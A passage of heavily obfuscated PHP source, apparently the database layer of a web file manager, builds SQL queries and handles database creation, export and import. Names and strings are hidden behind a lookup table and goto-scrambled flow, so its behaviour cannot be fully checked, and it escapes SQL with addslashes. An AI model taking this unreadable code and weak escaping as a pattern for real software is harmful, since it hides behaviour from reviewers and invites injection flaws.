= substr($EáÒãÛ±‰, 0, -4); } } else { $EáÒãÛ±‰ .= $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[963] . $this->parseValue($fˆ‚’’åöå); } return $EáÒãÛ±‰; } protected function parseThinkWhere($AŠ¸ïô¥ïô, $Cµó«¦‡Âª) { $DÓƒÎ–Õù =& $_SERVER[Ïº«‚ßèÔˆø]; $CÙçˆ­»Ù = $DÓƒÎ–Õù[33]; switch ($AŠ¸ïô¥ïô) { case $DÓƒÎ–Õù[349]: $CÙçˆ­»Ù = $Cµó«¦‡Âª; break; case $DÓƒÎ–Õù[946]: $CÙçˆ­»Ù = is_string($Cµó«¦‡Âª) ? $Cµó«¦‡Âª : substr($this->parseWhere($Cµó«¦‡Âª), 6); break; case $DÓƒÎ–Õù[964]: parse_str($Cµó«¦‡Âª, $cÓï”´×˜í); if (isset($cÓï”´×˜í[$DÓƒÎ–Õù[941]])) { $Fë°©ÒÅôâ = $DÓƒÎ–Õù[50] . strtoupper($cÓï”´×˜í[$DÓƒÎ–Õù[941]]) . $DÓƒÎ–Õù[50]; unset($cÓï”´×˜í[$DÓƒÎ–Õù[941]]); } else { $Fë°©ÒÅôâ = $DÓƒÎ–Õù[945]; } $EöÛïÏİ°¸ = array(); foreach ($cÓï”´×˜í as $EâìÒÒ¢ => $DÁ´¬ÈÂ©×) { $EöÛïÏİ°¸[] = $this->parseKey($EâìÒÒ¢) . $DÓƒÎ–Õù[963] . $this->parseValue($DÁ´¬ÈÂ©×); } $CÙçˆ­»Ù = implode($Fë°©ÒÅôâ, $EöÛïÏİ°¸); break; } return $CÙçˆ­»Ù; } protected function parseLimit($B°‡¡˜¾¬) { $EçÃÚÖˆ•ğ =& $_SERVER[Ïº«‚ßèÔˆø]; return !empty($B°‡¡˜¾¬) ? $EçÃÚÖˆ•ğ[48] . $B°‡¡˜¾¬ . $EçÃÚÖˆ•ğ[50] : $EçÃÚÖˆ•ğ[33]; } protected function parseJoin($D˜Éº­è†‡) { $f–â¹¶õ¹ =& $_SERVER[Ïº«‚ßèÔˆø]; $a‰¸ÆÜ ¢ = $f–â¹¶õ¹[33]; if (!empty($D˜Éº­è†‡)) { if (is_array($D˜Éº­è†‡)) { foreach ($D˜Éº­è†‡ as $b¦È¨›Ÿ©İ => $eÄÒ‘‘°¿¤) { if (!1 !== stripos($eÄÒ‘‘°¿¤, $f–â¹¶õ¹[965])) { $a‰¸ÆÜ ¢ .= $f–â¹¶õ¹[50] . $eÄÒ‘‘°¿¤; } else { $a‰¸ÆÜ ¢ .= $f–â¹¶õ¹[966] . $eÄÒ‘‘°¿¤; } } } else { $a‰¸ÆÜ ¢ .= $f–â¹¶õ¹[966] . $D˜Éº­è†‡; } } $a‰¸ÆÜ ¢ = preg_replace($f–â¹¶õ¹[967], think_config($f–â¹¶õ¹[873]) . $f–â¹¶õ¹[968], $a‰¸ÆÜ ¢); return $a‰¸ÆÜ ¢; } protected function parseOrder($b‰Æ—ª„ã) { $a…Ê®Ä‚Ì =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_array($b‰Æ—ª„ã)) { $ağ…àœŞİ = array(); foreach ($b‰Æ—ª„ã as $DÔ·¹Äëì => $BÜÁ¤£‘º‘) { if (is_numeric($DÔ·¹Äëì)) { $ağ…àœŞİ[] = $this->parseKey($BÜÁ¤£‘º‘); } else { $BÜÁ¤£‘º‘ = in_array(strtoupper(trim($BÜÁ¤£‘º‘)), array($a…Ê®Ä‚Ì[969], $a…Ê®Ä‚Ì[970])) ? $a…Ê®Ä‚Ì[50] . $BÜÁ¤£‘º‘ : $a…Ê®Ä‚Ì[33]; if (preg_match($a…Ê®Ä‚Ì[971], $DÔ·¹Äëì)) { $ağ…àœŞİ[] = $this->parseKey($DÔ·¹Äëì) . $BÜÁ¤£‘º‘; } else { think_exception($a…Ê®Ä‚Ì[972] . $DÔ·¹Äëì); } } } $b‰Æ—ª„ã = implode($a…Ê®Ä‚Ì[47], $ağ…àœŞİ); } return !empty($b‰Æ—ª„ã) ? $a…Ê®Ä‚Ì[973] . $b‰Æ—ª„ã : $a…Ê®Ä‚Ì[33]; } protected function parseGroup($cœ¡ŒÇâ¢¨) { $F‰¯Éùôõ =& $_SERVER[Ïº«‚ßèÔˆø]; return !empty($cœ¡ŒÇâ¢¨) ? $F‰¯Éùôõ[974] . $cœ¡ŒÇâ¢¨ : $F‰¯Éùôõ[33]; } protected function parseHaving($Aò©ƒ°ŞĞ®) { $aŞË¤ÎÉ› =& $_SERVER[Ïº«‚ßèÔˆø]; return !empty($Aò©ƒ°ŞĞ®) ? $aŞË¤ÎÉ›[975] . $Aò©ƒ°ŞĞ® : $aŞË¤ÎÉ›[33]; } protected function parseComment($FàÙŞÔ¸Üò) { $E±›½ÜÂµ­ =& $_SERVER[Ïº«‚ßèÔˆø]; return !empty($FàÙŞÔ¸Üò) ? $E±›½ÜÂµ­[976] . $FàÙŞÔ¸Üò . $E±›½ÜÂµ­[977] : $E±›½ÜÂµ­[33]; } protected function parseDistinct($DºË÷ÃîÃ£) { $E•¯´¼Õğ =& $_SERVER[Ïº«‚ßèÔˆø]; return !empty($DºË÷ÃîÃ£) ? $E•¯´¼Õğ[978] : $E•¯´¼Õğ[33]; } protected function parseUnion($d¾ï¡èĞ‹) { $e³íœò—Ô­ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($d¾ï¡èĞ‹)) { return $e³íœò—Ô­[33]; } if (isset($d¾ï¡èĞ‹[$e³íœò—Ô­[345]])) { $e¾ã’¨— = $e³íœò—Ô­[979]; unset($d¾ï¡èĞ‹[$e³íœò—Ô­[345]]); } else { $e¾ã’¨— = $e³íœò—Ô­[980]; } foreach ($d¾ï¡èĞ‹ as $FÄİ—¤ªÇ¬) { $a×¥„•ÚõÅ[] = $e¾ã’¨— . (is_array($FÄİ—¤ªÇ¬) ? $this->buildSelectSql($FÄİ—¤ªÇ¬) : $FÄİ—¤ªÇ¬); } return implode($e³íœò—Ô­[50], $a×¥„•ÚõÅ); } public function insert($c…µ£¾ß, $DåˆÜ½„« = array(), $d”‘¿¬¬ = false) { goto e…ğ¢Æë—ñ; e…ğ¢Æë—ñ: $dçùºŠè¹ =& $_SERVER[Ïº«‚ßèÔˆø]; $c£«ôïºÕÏ = $cóØšõƒ©Å = array(); $this->model = $DåˆÜ½„«[$dçùºŠè¹[278]]; goto c½‚ÒÁ†‡Ê; c½‚ÒÁ†‡Ê: foreach ($c…µ£¾ß as $CË¢èŒ¶äˆ => $a†¯ºÒğ“¤) { if (is_array($a†¯ºÒğ“¤) && $dçùºŠè¹[294] == $a†¯ºÒğ“¤[0]) { $cóØšõƒ©Å[] = $this->parseKey($CË¢èŒ¶äˆ); $c£«ôïºÕÏ[] = $a†¯ºÒğ“¤[1]; } elseif (is_scalar($a†¯ºÒğ“¤) || is_null($a†¯ºÒğ“¤)) { $cóØšõƒ©Å[] = $this->parseKey($CË¢èŒ¶äˆ); $c£«ôïºÕÏ[] = $this->parseValue($a†¯ºÒğ“¤); } } $CÜ¦•Œ›¿¬ = ($d”‘¿¬¬ ? $dçùºŠè¹[851] : $dçùºŠè¹[852]) . $dçùºŠè¹[853] . $this->parseTable($DåˆÜ½„«[$dçùºŠè¹[276]]) . $dçùºŠè¹[847] . implode($dçùºŠè¹[47], $cóØšõƒ©Å) . $dçùºŠè¹[848] . implode($dçùºŠè¹[47], $c£«ôïºÕÏ) . $dçùºŠè¹[849]; $CÜ¦•Œ›¿¬ .= $this->parseLock(isset($DåˆÜ½„«[$dçùºŠè¹[804]]) ? $DåˆÜ½„«[$dçùºŠè¹[804]] : !1); goto fã’Îéš; fã’Îéš: $CÜ¦•Œ›¿¬ .= $this->parseComment(!empty($DåˆÜ½„«[$dçùºŠè¹[351]]) ? $DåˆÜ½„«[$dçùºŠè¹[351]] : $dçùºŠè¹[33]); return $this->execute($CÜ¦•Œ›¿¬, $this->parseBind(!empty($DåˆÜ½„«[$dçùºŠè¹[282]]) ? $DåˆÜ½„«[$dçùºŠè¹[282]] : array())); goto eê¡ÎÅ…ƒ¤; eê¡ÎÅ…ƒ¤: } public function selectInsert($DôŞ¹ˆ›ğÈ, $e”˜´«‚²¸, $FÙŞñ¥¢½‡ = array()) { goto C¨»ò™æ±Í; cÛ–¤õ¼¤ñ: return $this->execute($Fˆ½î‚†õÓ, $this->parseBind(!empty($FÙŞñ¥¢½‡[$e¹ÛÃ±Ä¢[282]]) ? $FÙŞñ¥¢½‡[$e¹ÛÃ±Ä¢[282]] : array())); goto C±¼ŒÔ¿÷Ä; C¨»ò™æ±Í: $e¹ÛÃ±Ä¢ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->model = $FÙŞñ¥¢½‡[$e¹ÛÃ±Ä¢[278]]; if (is_string($DôŞ¹ˆ›ğÈ)) { $DôŞ¹ˆ›ğÈ = explode($e¹ÛÃ±Ä¢[47], $DôŞ¹ˆ›ğÈ); } goto aÙÃâ¡Î©Œ; aÙÃâ¡Î©Œ: array_walk($DôŞ¹ˆ›ğÈ, array($this, $e¹ÛÃ±Ä¢[850])); $Fˆ½î‚†õÓ = $e¹ÛÃ±Ä¢[981] . $this->parseTable($e”˜´«‚²¸) . $e¹ÛÃ±Ä¢[847] . implode($e¹ÛÃ±Ä¢[47], $DôŞ¹ˆ›ğÈ) . $e¹ÛÃ±Ä¢[959]; $Fˆ½î‚†õÓ .= $this->buildSelectSql($FÙŞñ¥¢½‡); goto cÛ–¤õ¼¤ñ; C±¼ŒÔ¿÷Ä: } public function update($fŒÅ„–Ÿ, $EÊ Œ‚óë) { $b¯Ä×¹Åö‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->model = $EÊ Œ‚óë[$b¯Ä×¹Åö‡[278]]; $F­®âÖï¶Ş = $b¯Ä×¹Åö‡[982] . $this->parseTable($EÊ Œ‚óë[$b¯Ä×¹Åö‡[276]]) . $this->parseSet($fŒÅ„–Ÿ) . $this->parseWhere(!empty($EÊ Œ‚óë[$b¯Ä×¹Åö‡[272]]) ? $EÊ Œ‚óë[$b¯Ä×¹Åö‡[272]] : $b¯Ä×¹Åö‡[33]) . $this->parseOrder(!empty($EÊ Œ‚óë[$b¯Ä×¹Åö‡[362]]) ? $EÊ Œ‚óë[$b¯Ä×¹Åö‡[362]] : $b¯Ä×¹Åö‡[33]) . $this->parseLimit(!empty($EÊ Œ‚óë[$b¯Ä×¹Åö‡[289]]) ? $EÊ Œ‚óë[$b¯Ä×¹Åö‡[289]] : $b¯Ä×¹Åö‡[33]) . $this->parseLock(isset($EÊ Œ‚óë[$b¯Ä×¹Åö‡[804]]) ? $EÊ Œ‚óë[$b¯Ä×¹Åö‡[804]] : !1) . $this->parseComment(!empty($EÊ Œ‚óë[$b¯Ä×¹Åö‡[351]]) ? $EÊ Œ‚óë[$b¯Ä×¹Åö‡[351]] : $b¯Ä×¹Åö‡[33]); return $this->execute($F­®âÖï¶Ş, $this->parseBind(!empty($EÊ Œ‚óë[$b¯Ä×¹Åö‡[282]]) ? $EÊ Œ‚óë[$b¯Ä×¹Åö‡[282]] : array())); } public function delete($DŠÎòğß§ = array()) { $Cò¦»â‘Á• =& $_SERVER[Ïº«‚ßèÔˆø]; $this->model = $DŠÎòğß§[$Cò¦»â‘Á•[278]]; $FĞƒíÌÊ—è = $Cò¦»â‘Á•[983] . $this->parseTable($DŠÎòğß§[$Cò¦»â‘Á•[276]]) . $this->parseWhere(!empty($DŠÎòğß§[$Cò¦»â‘Á•[272]]) ? $DŠÎòğß§[$Cò¦»â‘Á•[272]] : $Cò¦»â‘Á•[33]) . $this->parseOrder(!empty($DŠÎòğß§[$Cò¦»â‘Á•[362]]) ? $DŠÎòğß§[$Cò¦»â‘Á•[362]] : $Cò¦»â‘Á•[33]) . $this->parseLimit(!empty($DŠÎòğß§[$Cò¦»â‘Á•[289]]) ? $DŠÎòğß§[$Cò¦»â‘Á•[289]] : $Cò¦»â‘Á•[33]) . $this->parseLock(isset($DŠÎòğß§[$Cò¦»â‘Á•[804]]) ? $DŠÎòğß§[$Cò¦»â‘Á•[804]] : !1) . $this->parseComment(!empty($DŠÎòğß§[$Cò¦»â‘Á•[351]]) ? $DŠÎòğß§[$Cò¦»â‘Á•[351]] : $Cò¦»â‘Á•[33]); return $this->execute($FĞƒíÌÊ—è, $this->parseBind(!empty($DŠÎòğß§[$Cò¦»â‘Á•[282]]) ? $DŠÎòğß§[$Cò¦»â‘Á•[282]] : array())); } public function select($c±Ç¿ˆ«” = array()) { goto dÜÙ¹¦Œ³Õ; dÜÙ¹¦Œ³Õ: $dÙô˜êÔùÂ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->model = $c±Ç¿ˆ«”[$dÙô˜êÔùÂ[278]]; $f‰¢áÙ­”š = $this->buildSelectSql($c±Ç¿ˆ«”); goto bõ·’„ ¦Ñ; cì¾‰ï¦–: if ($dÛ©óÙÓÓ && !1 !== $dÍ·Ë¢í¢‚) { think_cache($e¿š”ù÷§, $dÍ·Ë¢í¢‚, $dÛ©óÙÓÓ); } return $dÍ·Ë¢í¢‚; goto d¹ŠÚöâ“; bõ·’„ ¦Ñ: $dÛ©óÙÓÓ = isset($c±Ç¿ˆ«”[$dÙô˜êÔùÂ[346]]) ? $c±Ç¿ˆ«”[$dÙô˜êÔùÂ[346]] : !1; if ($dÛ©óÙÓÓ) { $e¿š”ù÷§ = is_string($dÛ©óÙÓÓ[$dÙô˜êÔùÂ[93]]) ? $dÛ©óÙÓÓ[$dÙô˜êÔùÂ[93]] : $dÙô˜êÔùÂ[984] . md5($f‰¢áÙ­”š); $e¤ËÆõø = think_cache($e¿š”ù÷§, $dÙô˜êÔùÂ[33], $dÛ©óÙÓÓ); if (!1 !== $e¤ËÆõø) { return $e¤ËÆõø; } } $dÍ·Ë¢í¢‚ = $this->query($f‰¢áÙ­”š, $this->parseBind(!empty($c±Ç¿ˆ«”[$dÙô˜êÔùÂ[282]]) ? $c±Ç¿ˆ«”[$dÙô˜êÔùÂ[282]] : array())); goto cì¾‰ï¦–; d¹ŠÚöâ“: } public function buildSelectSql($CöÀ¼¦Û‡´ = array()) { goto EÊîÔÕ¦ÂÃ; a„ƒ±×›¨Û: return $A–‡¬Œ«Ü°; goto FãĞˆ«¢; C£óîÀÕ©: $A–‡¬Œ«Ü° = $this->parseSql($this->selectSql, $CöÀ¼¦Û‡´); $A–‡¬Œ«Ü° .= $this->parseLock(isset($CöÀ¼¦Û‡´[$BŒåöŞ‡®£[804]]) ? $CöÀ¼¦Û‡´[$BŒåöŞ‡®£[804]] : !1); if (isset($Có¹õ«…ƒ)) { think_cache($Có¹õ«…ƒ, $A–‡¬Œ«Ü°); } goto a„ƒ±×›¨Û; EÊîÔÕ¦ÂÃ: $BŒåöŞ‡®£ =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset($CöÀ¼¦Û‡´[$BŒåöŞ‡®£[350]])) { if (strpos($CöÀ¼¦Û‡´[$BŒåöŞ‡®£[350]], $BŒåöŞ‡®£[47])) { list($F½ç¥¥ì, $fØÛ’Š¯”è) = explode($BŒåöŞ‡®£[47], $CöÀ¼¦Û‡´[$BŒåöŞ‡®£[350]]); } else { $F½ç¥¥ì = $CöÀ¼¦Û‡´[$BŒåöŞ‡®£[350]]; } $F½ç¥¥ì = $F½ç¥¥ì ? $F½ç¥¥ì : 1; $fØÛ’Š¯”è = isset($fØÛ’Š¯”è) ? $fØÛ’Š¯”è : (is_numeric($CöÀ¼¦Û‡´[$BŒåöŞ‡®£[289]]) ? $CöÀ¼¦Û‡´[$BŒåöŞ‡®£[289]] : 20); $Cíë„†¡¾İ = $fØÛ’Š¯”è * ((int) $F½ç¥¥ì - 1); $CöÀ¼¦Û‡´[$BŒåöŞ‡®£[289]] = $Cíë„†¡¾İ . $BŒåöŞ‡®£[47] . $fØÛ’Š¯”è; } if (think_config($BŒåöŞ‡®£[985])) { $Có¹õ«…ƒ = $BŒåöŞ‡®£[986] . md5(serialize($CöÀ¼¦Û‡´)); $EÁåÚÕá‰ = think_cache($Có¹õ«…ƒ); if ($EÁåÚÕá‰) { return $EÁåÚÕá‰; } } goto C£óîÀÕ©; FãĞˆ«¢: } public function parseSql($fœä†èãó¿, $e¨òñ¿Ë‹Ğ = array()) { $CÆÒáÈ¾¿’ =& $_SERVER[Ïº«‚ßèÔˆø]; $fœä†èãó¿ = str_replace(array($CÆÒáÈ¾¿’[987], $CÆÒáÈ¾¿’[988], $CÆÒáÈ¾¿’[989], $CÆÒáÈ¾¿’[990], $CÆÒáÈ¾¿’[991], $CÆÒáÈ¾¿’[992], $CÆÒáÈ¾¿’[993], $CÆÒáÈ¾¿’[994], $CÆÒáÈ¾¿’[995], $CÆÒáÈ¾¿’[996], $CÆÒáÈ¾¿’[997]), array($this->parseTable("{$e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[276]]}"), $this->parseDistinct(isset($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[998]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[998]] : !1), $this->parseField(!empty($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[270]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[270]] : $CÆÒáÈ¾¿’[182]), $this->parseJoin(!empty($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[279]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[279]] : $CÆÒáÈ¾¿’[33]), $this->parseWhere(!empty($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[272]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[272]] : $CÆÒáÈ¾¿’[33]), $this->parseGroup(!empty($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[999]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[999]] : $CÆÒáÈ¾¿’[33]), $this->parseHaving(!empty($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[1000]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[1000]] : $CÆÒáÈ¾¿’[33]), $this->parseOrder(!empty($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[362]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[362]] : $CÆÒáÈ¾¿’[33]), $this->parseLimit(!empty($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[289]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[289]] : $CÆÒáÈ¾¿’[33]), $this->parseUnion(!empty($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[344]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[344]] : $CÆÒáÈ¾¿’[33]), $this->parseComment(!empty($e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[351]]) ? $e¨òñ¿Ë‹Ğ[$CÆÒáÈ¾¿’[351]] : $CÆÒáÈ¾¿’[33])), $fœä†èãó¿); return $fœä†èãó¿; } public function getLastSql($eõƒØÙôÆù = '') { return $eõƒØÙôÆù ? $this->modelSql[$eõƒØÙôÆù] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($BºñôòáÉÕ) { return addslashes($BºñôòáÉÕ); } public function setModel($cµä³ïÄƒÖ) { $this->model = $cµä³ïÄƒÖ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Bõ¦Óéğñ…, $cíË´£İæ³ = '') { $this->database = $Bõ¦Óéğñ…; $this->type = $cíË´£İæ³; } public function model($e“Ş½”ÖÅ‹ = '') { return new ModelBase($e“Ş½”ÖÅ‹, $_SERVER[Ïº«‚ßèÔˆø][33], $this->database); } public function db($b‚¹À¼—ç = false) { goto AĞµìŒí‡©; AÑ¿Ìç÷: $D‡‚ÌîÆ°õ = $bæ‹»Ú¥”[$Eôˆ¾ìƒè[913]]; $bæ‹»Ú¥”[$Eôˆ¾ìƒè[913]] = $Eôˆ¾ìƒè[33]; if ($bæ‹»Ú¥”[$Eôˆ¾ìƒè[738]] == $Eôˆ¾ìƒè[739]) { $cÉÊ–…‡ª‹ = $bæ‹»Ú¥”[$Eôˆ¾ìƒè[740]]; $bæ‹»Ú¥”[$Eôˆ¾ìƒè[740]] = substr($cÉÊ–…‡ª‹, 0, strrpos($cÉÊ–…‡ª‹, $Eôˆ¾ìƒè[1001])); } goto Fİª”Èö‹É; AĞµìŒí‡©: $Eôˆ¾ìƒè =& $_SERVER[Ïº«‚ßèÔˆø]; $bæ‹»Ú¥” = array_change_key_case($this->database); if ($this->type == $Eôˆ¾ìƒè[9] || !$b‚¹À¼—ç) { return $this->model()->db(); } goto AÑ¿Ìç÷; fö²À™ŠŒ¿: $this->database = $bæ‹»Ú¥”; $EÉ¦ù¡çÕÄ->execute("\x75\163\145\x20\140{$D‡‚ÌîÆ°õ}\140"); return $EÉ¦ù¡çÕÄ; goto D¥Š³İ§á‘; f…É®Ğæ¡: if (!$cù–×š­ãÏ) { $EÉ¦ù¡çÕÄ->execute("\143\162\x65\x61\x74\x65\x20\144\x61\164\141\142\x61\x73\145\x20\x60{$D‡‚ÌîÆ°õ}\x60"); } $bæ‹»Ú¥”[$Eôˆ¾ìƒè[913]] = $D‡‚ÌîÆ°õ; if ($bæ‹»Ú¥”[$Eôˆ¾ìƒè[738]] == $Eôˆ¾ìƒè[739]) { $bæ‹»Ú¥”[$Eôˆ¾ìƒè[740]] .= $Eôˆ¾ìƒè[1001] . $D‡‚ÌîÆ°õ; } goto fö²À™ŠŒ¿; Fİª”Èö‹É: $this->database = $bæ‹»Ú¥”; $EÉ¦ù¡çÕÄ = $this->model()->db(); try { $cù–×š­ãÏ = $EÉ¦ù¡çÕÄ->execute("\x73\x68\x6f\x77\x20\144\141\x74\141\142\x61\x73\145\163\x20\154\151\153\x65\40\47{$D‡‚ÌîÆ°õ}\47"); } catch (Exception $f¿„œÚâ¡®) { } goto f…É®Ğæ¡; D¥Š³İ§á‘: } public function createTable($F—˜ª·Œ…ç, $eÇ›ĞŒÎôŠ = null) { $a¨×‰İÄ¼ù =& $_SERVER[Ïº«‚ßèÔˆø]; if (!IO::exist($F—˜ª·Œ…ç)) { ActionCall($a¨×‰İÄ¼ù[1002], !0, 0); show_json(LNG($a¨×‰İÄ¼ù[1003]), !1); } $aƒÍš’Ì«¦ = sqlSplit(IO::getContent($F—˜ª·Œ…ç)); foreach ($aƒÍš’Ì«¦ as $B·ø„—‘ì) { if ($eÇ›ĞŒÎôŠ) { $aíÔàáöÅ½ = stripos($B·ø„—‘ì, $a¨×‰İÄ¼ù[1004]) === 0; if ($aíÔàáöÅ½) { $eÇ›ĞŒÎôŠ->task[$a¨×‰İÄ¼ù[1005]] += 1; } } $this->model()->db()->execute($B·ø„—‘ì); if ($eÇ›ĞŒÎôŠ && $aíÔàáöÅ½) { preg_match($a¨×‰İÄ¼ù[1006], $B·ø„—‘ì, $B«É§Ò’Çé); $eÇ›ĞŒÎôŠ->task[$a¨×‰İÄ¼ù[1007]] = $B«É§Ò’Çé[1]; $eÇ›ĞŒÎôŠ->update(1); } } $this->taskToCache($eÇ›ĞŒÎôŠ); } public function insertTable($B°Ñ´Û…ß, $Eêç”©áˆ = null) { $Eá¥ÜÑÏÜí =& $_SERVER[Ïº«‚ßèÔˆø]; $cäº¾²ê÷‚ = $this->model()->db(); $Aäà©¥›éº = $cèä‹óä ? array($cèä‹óä) : $cäº¾²ê÷‚->getTables(); foreach ($B°Ñ´Û…ß as $FĞœ¨âã) { $cèä‹óä = basename($FĞœ¨âã, $Eá¥ÜÑÏÜí[730]); if (!in_array($cèä‹óä, $Aäà©¥›éº)) { continue; } if ($Eêç”©áˆ) { $Eêç”©áˆ->task[$Eá¥ÜÑÏÜí[1007]] = $cèä‹óä; } if (get_filesize($FĞœ¨âã) == 0) { continue; } $aî×ÂéŸ¾» = $this->sqlToDb($FĞœ¨âã, $Eêç”©áˆ); if (!$aî×ÂéŸ¾») { ActionCall($Eá¥ÜÑÏÜí[1002], !0, 0); show_json(LNG($Eá¥ÜÑÏÜí[1008]) . "\133{$cèä‹óä}\x5d", !1); } } $this->taskToCache($Eêç”©áˆ); } public function sqlFromDb($F½¬ô‰ÑÛ×, $BßÎÀµ˜¤…, $e¬ŠÊ­¸ÕÉ = null, $b¡ÏÆ™¸îÛ = null) { goto b¯…ÇËğìé; bĞ“è§Š‚: $dÑÁŠ§¼¢Ø = $F§À¨Á‘¿->getPk(); $fÔ™Ø‚î„ = $F§À¨Á‘¿->getDbFields(); do { $cİØ‹•ë–¬ = array($dÑÁŠ§¼¢Ø => array($_SERVER[Ïº«‚ßèÔˆø][955], $Aè˜‰™çŠ)); $bºâ®¸±ô¹ = $F§À¨Á‘¿->where($cİØ‹•ë–¬)->field($fÔ™Ø‚î„)->order($dÑÁŠ§¼¢Ø . $_SERVER[Ïº«‚ßèÔˆø][1010])->limit($CÛ·ÒÌ³†ï)->select(); $bºâ®¸±ô¹ = !empty($bºâ®¸±ô¹) ? $bºâ®¸±ô¹ : array(); if (!($B®‚…ŠÚñ¿ = count($bºâ®¸±ô¹))) { break; } $e©ëƒ¿Î’‹ = end($bºâ®¸±ô¹); $Aè˜‰™çŠ = $e©ëƒ¿Î’‹[$dÑÁŠ§¼¢Ø]; $CµÎ‚‘ï = array(); foreach ($bºâ®¸±ô¹ as $Fˆèª¿Õ´…) { if ($F½¬ô‰ÑÛ× == $_SERVER[Ïº«‚ßèÔˆø][1011] && $Fˆèª¿Õ´…[$_SERVER[Ïº«‚ßèÔˆø][29]] == $_SERVER[Ïº«‚ßèÔˆø][1012]) { $D®Í‚Õ›ä = json_decode($Fˆèª¿Õ´…[$_SERVER[Ïº«‚ßèÔˆø][371]], !0); if ($D®Í‚Õ›ä[$_SERVER[Ïº«‚ßèÔˆø][28]] == date($_SERVER[Ïº«‚ßèÔˆø][698]) && !$D®Í‚Õ›ä[$_SERVER[Ïº«‚ßèÔˆø][697]]) { continue; } } if ($b¡ÏÆ™¸îÛ) { $Fˆèª¿Õ´…[$_SERVER[Ïº«‚ßèÔˆø][76]] = "\173\x69\x6f\x3a{$b¡ÏÆ™¸îÛ}\175" . substr($Fˆèª¿Õ´…[$_SERVER[Ïº«‚ßèÔˆø][76]], strlen("\173\x69\x6f\x3a{$Fˆèª¿Õ´…[$_SERVER[Ïº«‚ßèÔˆø][774]]}\x7d")); $Fˆèª¿Õ´…[$_SERVER[Ïº«‚ßèÔˆø][774]] = $b¡ÏÆ™¸îÛ; } $CµÎ‚‘ï[] = $_SERVER[Ïº«‚ßèÔˆø][1013] . $this->sqlEncode($Fˆèª¿Õ´…) . $_SERVER[Ïº«‚ßèÔˆø][1014]; } $CÜóÃÌŸ‘¯ = "\x49\116\123\105\x52\x54\40\x49\116\124\x4f\40\x60{$F½¬ô‰ÑÛ×}\140\40\50\x60" . implode($_SERVER[Ïº«‚ßèÔˆø][1015], $fÔ™Ø‚î„) . $_SERVER[Ïº«‚ßèÔˆø][1016]; fwrite($e¸ Úä·àĞ, $CÜóÃÌŸ‘¯ . implode($_SERVER[Ïº«‚ßèÔˆø][1017], $CµÎ‚‘ï) . $_SERVER[Ïº«‚ßèÔˆø][68] . PHP_EOL); $bØÛµÀ¹÷è += $B®‚…ŠÚñ¿; if ($e¬ŠÊ­¸ÕÉ) { $e¬ŠÊ­¸ÕÉ->update($B®‚…ŠÚñ¿); } } while ($CÛ·ÒÌ³†ï == $B®‚…ŠÚñ¿); goto Aåöé£Ê‡Œ; b¯…ÇËğìé: if ($e¬ŠÊ­¸ÕÉ) { $e¬ŠÊ­¸ÕÉ->task[$_SERVER[Ïº«‚ßèÔˆø][1007]] = $F½¬ô‰ÑÛ×; } $F§À¨Á‘¿ = $this->model($F½¬ô‰ÑÛ×); $bØÛµÀ¹÷è = 0; goto fò§Æ›ÅÛÒ; Aåöé£Ê‡Œ: fclose($e¸ Úä·àĞ); return $bØÛµÀ¹÷è; goto bé‘Ë—Õ; fò§Æ›ÅÛÒ: $Aè˜‰™çŠ = 0; $CÛ·ÒÌ³†ï = 10000; $e¸ Úä·àĞ = fopen($BßÎÀµ˜¤…, $_SERVER[Ïº«‚ßèÔˆø][1009]); goto bĞ“è§Š‚; bé‘Ë—Õ: } public function sqlToDb($aŞ«Ãõ¶á, $Bˆê£È—‰Ø = null) { goto B½òÈù£; dîŒ§Ş†ñ: fclose($f¦³ĞÇÃŒ); if (!empty($b¶„²Ôš× )) { $cˆöÏ­ï—ô = $B¡Ù‡ä±¢ . implode($b¡â÷–”ğì[47], $b¶„²Ôš× ); if (!$d“í§æœ³->execute($cˆöÏ­ï—ô)) { return !1; } if ($Bˆê£È—‰Ø) { $Bˆê£È—‰Ø->update($bª¶á“ß·ë); } } return !0; goto D»…»‘®‘¥; Bµ¤æ¦æù: if (!$f¦³ĞÇÃŒ) { return !1; } $bª¶á“ß·ë = 0; $B¡Ù‡ä±¢ = $b¡â÷–”ğì[33]; goto DÜéá•›šï; B½òÈù£: $b¡â÷–”ğì =& $_SERVER[Ïº«‚ßèÔˆø]; $d“í§æœ³ = $this->model()->db(); $f¦³ĞÇÃŒ = @fopen($aŞ«Ãõ¶á, $b¡â÷–”ğì[1018]); goto Bµ¤æ¦æù; DÜéá•›šï: $b¶„²Ôš×  = array(); $d³…äò·Á = $this->type == $b¡â÷–”ğì[9] ? 500 : 2000; while (!feof($f¦³ĞÇÃŒ)) { $c¸†™š´† = trim(fgets($f¦³ĞÇÃŒ)); if (!$c¸†™š´†) { continue; } 